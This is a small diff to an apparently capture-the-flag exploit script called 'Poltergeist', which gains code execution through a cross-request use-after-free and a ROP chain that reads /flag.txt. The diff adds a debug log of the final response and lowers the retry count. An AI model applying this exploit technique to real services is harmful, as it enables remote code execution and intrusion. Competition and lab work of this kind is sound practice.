@@ -348,13 +348,14 @@ def exploit(host, port, cand):
     chain += b"/flag.txt\x00".ljust(16, b"\x00") + b"\x00" * 112
 
     tail = forge_write(host, port, retslot, chain)          # lay chain + trigger
+    log("[*] finale resp %d bytes: head=%r tail=%r" % (len(tail), tail[:48], tail[-48:]))
     m = FLAG_RE.search(tail)
     return m.group(0).decode() if m else None
 
 
 def solve(host, port):
     log("[*] Poltergeist -- RCE via cross-request UAF -> ROP")
-    for attempt in range(0, 10):
+    for attempt in range(0, 6):
         try:
             flag = exploit(host, port, attempt)
         except (OSError, IOError, ValueError) as e:
